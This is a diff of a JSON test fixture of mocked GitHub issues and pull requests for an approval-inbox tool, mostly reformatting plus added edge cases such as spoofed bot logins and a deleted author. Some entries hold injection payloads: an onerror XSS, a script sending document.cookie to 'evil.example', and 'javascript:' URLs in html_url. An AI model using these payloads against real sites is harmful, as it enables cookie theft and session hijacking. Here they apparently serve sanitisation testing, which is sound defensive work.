@@ -10,9 +10,19 @@
       "body": "<!-- pt-inbox -->\n**Your answer:** /approve never read from the inbox issue",
       "html_url": "https://github.com/geeera/edge-cases/issues/1",
       "state": "open",
-      "labels": [{ "name": "team:inbox" }, { "name": "needs:owner" }],
+      "labels": [
+        {
+          "name": "team:inbox"
+        },
+        {
+          "name": "needs:owner"
+        }
+      ],
       "author_association": "OWNER",
-      "user": { "login": "geeera", "type": "User" },
+      "user": {
+        "login": "geeera",
+        "type": "User"
+      },
       "milestone": null,
       "closed_at": null
     },
@@ -22,9 +32,19 @@
       "body": "One comment per run.",
       "html_url": "https://github.com/geeera/edge-cases/issues/2",
       "state": "open",
-      "labels": [{ "name": "team:run-log" }, { "name": "team:paused" }],
+      "labels": [
+        {
+          "name": "team:run-log"
+        },
+        {
+          "name": "team:paused"
+        }
+      ],
       "author_association": "OWNER",
-      "user": { "login": "geeera", "type": "User" },
+      "user": {
+        "login": "geeera",
+        "type": "User"
+      },
       "milestone": null,
       "closed_at": null
     },
@@ -34,12 +54,24 @@
       "body": "**Your answer:** /approve",
       "html_url": "https://github.com/geeera/edge-cases/pull/3",
       "state": "open",
-      "labels": [{ "name": "needs:owner" }, { "name": "kind:question" }],
+      "labels": [
+        {
+          "name": "needs:owner"
+        },
+        {
+          "name": "kind:question"
+        }
+      ],
       "author_association": "OWNER",
-      "user": { "login": "geeera", "type": "User" },
+      "user": {
+        "login": "geeera",
+        "type": "User"
+      },
       "milestone": null,
       "closed_at": null,
-      "pull_request": { "html_url": "https://github.com/geeera/edge-cases/pull/3" }
+      "pull_request": {
+        "html_url": "https://github.com/geeera/edge-cases/pull/3"
+      }
     },
     {
       "number": 10,
@@ -47,9 +79,22 @@
       "body": "**Your answer:** /go to release 1.2.0 (recommended) · /no-go why\n<!-- pt-ask -->\n\nDemo page: …",
       "html_url": "https://github.com/geeera/edge-cases/issues/10",
       "state": "open",
-      "labels": [{ "name": "team:demo" }, { "name": "kind:question" }, { "name": "owner:release" }],
+      "labels": [
+        {
+          "name": "team:demo"
+        },
+        {
+          "name": "kind:question"
+        },
+        {
+          "name": "owner:release"
+        }
+      ],
       "author_association": "OWNER",
-      "user": { "login": "geeera", "type": "User" },
+      "user": {
+        "login": "geeera",
+        "type": "User"
+      },
       "milestone": null,
       "closed_at": null
     },
@@ -60,12 +105,21 @@
       "html_url": "https://github.com/geeera/edge-cases/issues/11",
       "state": "open",
       "labels": [
-        { "name": "design:awaiting-approval" },
-        { "name": "kind:feature" },
-        { "name": "needs-design" }
+        {
+          "name": "design:awaiting-approval"
+        },
+        {
+          "name": "kind:feature"
+        },
+        {
+          "name": "needs-design"
+        }
       ],
       "author_association": "MEMBER",
-      "user": { "login": "designer", "type": "User" },
+      "user": {
+        "login": "designer",
+        "type": "User"
+      },
       "milestone": null,
       "closed_at": null
     },
@@ -75,9 +129,22 @@
       "body": "**Твой ответ:** /approve купить домен за $12 в год (рекомендую) · /reject причина\r\n<!-- pt-ask -->\r\n\r\nПодробности.",
       "html_url": "https://github.com/geeera/edge-cases/issues/12",
       "state": "open",
-      "labels": [{ "name": "kind:question" }, { "name": "owner:money" }, { "name": "status:blocked" }],
+      "labels": [
+        {
+          "name": "kind:question"
+        },
+        {
+          "name": "owner:money"
+        },
+        {
+          "name": "status:blocked"
+        }
+      ],
       "author_association": "OWNER",
-      "user": { "login": "geeera", "type": "User" },
+      "user": {
+        "login": "geeera",
+        "type": "User"
+      },
       "milestone": null,
       "closed_at": null
     },
@@ -87,9 +154,22 @@
       "body": "**Your answer:** /approve option A (recommended) · /reject why",
       "html_url": "https://github.com/geeera/edge-cases/issues/13",
       "state": "open",
-      "labels": [{ "name": "kind:question" }, { "name": "needs:owner" }, { "name": "owner:access" }],
+      "labels": [
+        {
+          "name": "kind:question"
+        },
+        {
+          "name": "needs:owner"
+        },
+        {
+          "name": "owner:access"
+        }
+      ],
       "author_association": "CONTRIBUTOR",
-      "user": { "login": "team-console-team[bot]", "type": "Bot" },
+      "user": {
+        "login": "team-console-team[bot]",
+        "type": "Bot"
+      },
       "milestone": null,
       "closed_at": null
     },
@@ -99,9 +179,16 @@
       "body": "**Your answer:** /approve <img src=x onerror=alert(document.cookie)> · /reject why\n\n<script>fetch('https://evil.example/'+document.cookie)</script>",
       "html_url": "https://github.com/geeera/edge-cases/issues/14",
       "state": "open",
-      "labels": [{ "name": "kind:question" }],
+      "labels": [
+        {
+          "name": "kind:question"
+        }
+      ],
       "author_association": "NONE",
-      "user": { "login": "outsider", "type": "User" },
+      "user": {
+        "login": "outsider",
+        "type": "User"
+      },
       "milestone": null,
       "closed_at": null
     },
@@ -111,9 +198,22 @@
       "body": "**Ваш ответ:** Напиши «сделал», когда заведёшь аккаунт",
       "html_url": "javascript:alert(document.domain)//https://github.com/",
       "state": "open",
-      "labels": [{ "name": "needs:owner" }, { "name": "kind:chore" }, { "name": "status:blocked" }],
+      "labels": [
+        {
+          "name": "needs:owner"
+        },
+        {
+          "name": "kind:chore"
+        },
+        {
+          "name": "status:blocked"
+        }
+      ],
       "author_association": "COLLABORATOR",
-      "user": { "login": "helper", "type": "User" },
+      "user": {
+        "login": "helper",
+        "type": "User"
+      },
       "milestone": null,
       "closed_at": null
     },
@@ -123,9 +223,19 @@
       "body": "",
       "html_url": "https://github.com/geeera/edge-cases/issues/16",
       "state": "open",
-      "labels": [{ "name": "needs:local" }, { "name": "kind:chore" }],
+      "labels": [
+        {
+          "name": "needs:local"
+        },
+        {
+          "name": "kind:chore"
+        }
+      ],
       "author_association": "FIRST_TIME_CONTRIBUTOR",
-      "user": { "login": "newcomer", "type": "User" },
+      "user": {
+        "login": "newcomer",
+        "type": "User"
+      },
       "milestone": null,
       "closed_at": null
     },
@@ -135,9 +245,22 @@
       "body": null,
       "html_url": "http://github.com/geeera/edge-cases/issues/17",
       "state": "open",
-      "labels": [{ "name": "needs:local" }, { "name": "needs:owner" }, { "name": "kind:chore" }],
+      "labels": [
+        {
+          "name": "needs:local"
+        },
+        {
+          "name": "needs:owner"
+        },
+        {
+          "name": "kind:chore"
+        }
+      ],
       "author_association": "OWNER",
-      "user": { "login": "geeera", "type": "User" },
+      "user": {
+        "login": "geeera",
+        "type": "User"
+      },
       "milestone": null,
       "closed_at": null
     },
@@ -147,9 +270,19 @@
       "body": "**Your answer:** /approve not an inbox item",
       "html_url": "https://github.com/geeera/edge-cases/issues/18",
       "state": "open",
-      "labels": [{ "name": "kind:feature" }, { "name": "status:approved" }],
+      "labels": [
+        {
+          "name": "kind:feature"
+        },
+        {
+          "name": "status:approved"
+        }
+      ],
       "author_association": "OWNER",
-      "user": { "login": "geeera", "type": "User" },
+      "user": {
+        "login": "geeera",
+        "type": "User"
+      },
       "milestone": null,
       "closed_at": null
     },
@@ -161,7 +294,10 @@
       "state": "open",
       "labels": [],
       "author_association": "NONE",
-      "user": { "login": "outsider", "type": "User" },
+      "user": {
+        "login": "outsider",
+        "type": "User"
+      },
       "milestone": null,
       "closed_at": null
     },
@@ -171,9 +307,92 @@
       "body": "**Your answer:**   ",
       "html_url": "https://github.com/geeera/edge-cases/issues/20",
       "state": "open",
-      "labels": [{ "name": "design:awaiting-approval" }],
+      "labels": [
+        {
+          "name": "design:awaiting-approval"
+        }
+      ],
       "author_association": "FIRST_TIMER",
-      "user": { "login": "firsttimer", "type": "User" },
+      "user": {
+        "login": "firsttimer",
+        "type": "User"
+      },
+      "milestone": null,
+      "closed_at": null
+    },
+    {
+      "number": 21,
+      "title": "A user named like the team app",
+      "body": "**Your answer:** /approve (recommended) · /reject why",
+      "html_url": "https://github.com/geeera/edge-cases/issues/21",
+      "state": "open",
+      "labels": [
+        {
+          "name": "kind:question"
+        }
+      ],
+      "author_association": "CONTRIBUTOR",
+      "user": {
+        "login": "team-console-team",
+        "type": "User"
+      },
+      "milestone": null,
+      "closed_at": null
+    },
+    {
+      "number": 22,
+      "title": "Another app",
+      "body": "**Your answer:** /approve (recommended) · /reject why",
+      "html_url": "https://github.com/geeera/edge-cases/issues/22",
+      "state": "open",
+      "labels": [
+        {
+          "name": "needs:owner"
+        },
+        {
+          "name": "kind:chore"
+        }
+      ],
+      "author_association": "CONTRIBUTOR",
+      "user": {
+        "login": "dependabot[bot]",
+        "type": "Bot"
+      },
+      "milestone": null,
+      "closed_at": null
+    },
+    {
+      "number": 23,
+      "title": "The team login on a non-bot account",
+      "body": "**Your answer:** /approve (recommended) · /reject why",
+      "html_url": "https://github.com/geeera/edge-cases/issues/23",
+      "state": "open",
+      "labels": [
+        {
+          "name": "kind:question"
+        }
+      ],
+      "author_association": "NONE",
+      "user": {
+        "login": "team-console-team[bot]",
+        "type": "User"
+      },
+      "milestone": null,
+      "closed_at": null
+    },
+    {
+      "number": 24,
+      "title": "A deleted author",
+      "body": "**Your answer:** /approve (recommended) · /reject why",
+      "html_url": "https://github.com/geeera/edge-cases/issues/24",
+      "state": "open",
+      "labels": [
+        {
+          "name": "kind:question"
+        }
+      ],
+      "author_association": "NONE",
+      "user": null,
       "milestone": null,
       "closed_at": null
     }
@@ -227,15 +446,31 @@
         "html_url": "https://github.com/geeera/edge-cases/issues/30",
         "state": "open",
         "labels": [
-          { "name": "kind:chore" },
-          { "name": "tier:heavy" },
-          { "name": "security" },
-          { "name": "tier-up" },
-          { "name": "status:in-progress" }
+          {
+            "name": "kind:chore"
+          },
+          {
+            "name": "tier:heavy"
+          },
+          {
+            "name": "security"
+          },
+          {
+            "name": "tier-up"
+          },
+          {
+            "name": "status:in-progress"
+          }
         ],
         "author_association": "OWNER",
-        "user": { "login": "geeera", "type": "User" },
-        "milestone": { "number": 4, "title": "Sprint 01" },
+        "user": {
+          "login": "geeera",
+          "type": "User"
+        },
+        "milestone": {
+          "number": 4,
+          "title": "Sprint 01"
+        },
         "closed_at": null
       },
       {
@@ -245,14 +480,28 @@
         "html_url": "https://github.com/geeera/edge-cases/issues/31",
         "state": "closed",
         "labels": [
-          { "name": "kind:feature" },
-          { "name": "tier:light" },
-          { "name": "tier-up" },
-          { "name": "status:done" }
+          {
+            "name": "kind:feature"
+          },
+          {
+            "name": "tier:light"
+          },
+          {
+            "name": "tier-up"
+          },
+          {
+            "name": "status:done"
+          }
         ],
         "author_association": "OWNER",
-        "user": { "login": "geeera", "type": "User" },
-        "milestone": { "number": 4, "title": "Sprint 01" },
+        "user": {
+          "login": "geeera",
+          "type": "User"
+        },
+        "milestone": {
+          "number": 4,
+          "title": "Sprint 01"
+        },
         "closed_at": "2026-09-30T10:00:00Z"
       },
       {
@@ -262,14 +511,28 @@
         "html_url": "https://github.com/geeera/edge-cases/issues/32",
         "state": "open",
         "labels": [
-          { "name": "kind:bug" },
-          { "name": "tier:light" },
-          { "name": "tier:heavy" },
-          { "name": "status:qa" }
+          {
+            "name": "kind:bug"
+          },
+          {
+            "name": "tier:light"
+          },
+          {
+            "name": "tier:heavy"
+          },
+          {
+            "name": "status:qa"
+          }
         ],
         "author_association": "OWNER",
-        "user": { "login": "geeera", "type": "User" },
-        "milestone": { "number": 4, "title": "Sprint 01" },
+        "user": {
+          "login": "geeera",
+          "type": "User"
+        },
+        "milestone": {
+          "number": 4,
+          "title": "Sprint 01"
+        },
         "closed_at": null
       },
       {
@@ -278,10 +541,23 @@
         "body": "",
         "html_url": "https://github.com/geeera/edge-cases/issues/33",
         "state": "open",
-        "labels": [{ "name": "kind:finding" }, { "name": "status:proposed" }],
+        "labels": [
+          {
+            "name": "kind:finding"
+          },
+          {
+            "name": "status:proposed"
+          }
+        ],
         "author_association": "NONE",
-        "user": { "login": "outsider", "type": "User" },
-        "milestone": { "number": 4, "title": "Sprint 01" },
+        "user": {
+          "login": "outsider",
+          "type": "User"
+        },
+        "milestone": {
+          "number": 4,
+          "title": "Sprint 01"
+        },
         "closed_at": null
       },
       {
@@ -290,10 +566,26 @@
         "body": "",
         "html_url": "https://github.com/geeera/edge-cases/issues/34",
         "state": "closed",
-        "labels": [{ "name": "kind:chore" }, { "name": "tier:standard" }, { "name": "status:blocked" }],
+        "labels": [
+          {
+            "name": "kind:chore"
+          },
+          {
+            "name": "tier:standard"
+          },
+          {
+            "name": "status:blocked"
+          }
+        ],
         "author_association": "OWNER",
-        "user": { "login": "geeera", "type": "User" },
-        "milestone": { "number": 4, "title": "Sprint 01" },
+        "user": {
+          "login": "geeera",
+          "type": "User"
+        },
+        "milestone": {
+          "number": 4,
+          "title": "Sprint 01"
+        },
         "closed_at": "2026-09-29T10:00:00Z"
       },
       {
@@ -302,10 +594,20 @@
         "body": "",
         "html_url": "https://github.com/geeera/edge-cases/issues/35",
         "state": "open",
-        "labels": [{ "name": "kind:question" }],
+        "labels": [
+          {
+            "name": "kind:question"
+          }
+        ],
         "author_association": "OWNER",
-        "user": { "login": "geeera", "type": "User" },
-        "milestone": { "number": 4, "title": "Sprint 01" },
+        "user": {
+          "login": "geeera",
+          "type": "User"
+        },
+        "milestone": {
+          "number": 4,
+          "title": "Sprint 01"
+        },
         "closed_at": null
       },
       {
@@ -314,10 +616,26 @@
         "body": "",
         "html_url": "https://github.com/geeera/edge-cases/issues/36",
         "state": "closed",
-        "labels": [{ "name": "kind:chore" }, { "name": "tier:gigantic" }, { "name": "status:done" }],
+        "labels": [
+          {
+            "name": "kind:chore"
+          },
+          {
+            "name": "tier:gigantic"
+          },
+          {
+            "name": "status:done"
+          }
+        ],
         "author_association": "OWNER",
-        "user": { "login": "geeera", "type": "User" },
-        "milestone": { "number": 4, "title": "Sprint 01" },
+        "user": {
+          "login": "geeera",
+          "type": "User"
+        },
+        "milestone": {
+          "number": 4,
+          "title": "Sprint 01"
+        },
         "closed_at": "2026-09-28T10:00:00Z"
       },
       {
@@ -326,10 +644,26 @@
         "body": "",
         "html_url": "https://github.com/geeera/edge-cases/issues/37",
         "state": "open",
-        "labels": [{ "name": "kind:feature" }, { "name": "tier:standard" }, { "name": "tier-up" }],
+        "labels": [
+          {
+            "name": "kind:feature"
+          },
+          {
+            "name": "tier:standard"
+          },
+          {
+            "name": "tier-up"
+          }
+        ],
         "author_association": "OWNER",
-        "user": { "login": "geeera", "type": "User" },
-        "milestone": { "number": 4, "title": "Sprint 01" },
+        "user": {
+          "login": "geeera",
+          "type": "User"
+        },
+        "milestone": {
+          "number": 4,
+          "title": "Sprint 01"
+        },
         "closed_at": null
       },
       {
@@ -338,12 +672,24 @@
         "body": "",
         "html_url": "https://github.com/geeera/edge-cases/pull/38",
         "state": "open",
-        "labels": [{ "name": "kind:feature" }],
+        "labels": [
+          {
+            "name": "kind:feature"
+          }
+        ],
         "author_association": "OWNER",
-        "user": { "login": "geeera", "type": "User" },
-        "milestone": { "number": 4, "title": "Sprint 01" },
+        "user": {
+          "login": "geeera",
+          "type": "User"
+        },
+        "milestone": {
+          "number": 4,
+          "title": "Sprint 01"
+        },
         "closed_at": null,
-        "pull_request": { "html_url": "https://github.com/geeera/edge-cases/pull/38" }
+        "pull_request": {
+          "html_url": "https://github.com/geeera/edge-cases/pull/38"
+        }
       }
     ]
   },
@@ -354,7 +700,10 @@
       "html_url": "https://github.com/geeera/edge-cases/pull/38",
       "draft": false,
       "author_association": "OWNER",
-      "user": { "login": "geeera", "type": "User" }
+      "user": {
+        "login": "geeera",
+        "type": "User"
+      }
     },
     {
       "number": 39,
@@ -362,7 +711,10 @@
       "html_url": "javascript:alert(1)",
       "draft": true,
       "author_association": "NONE",
-      "user": { "login": "outsider", "type": "User" }
+      "user": {
+        "login": "outsider",
+        "type": "User"
+      }
     }
   ]
 }
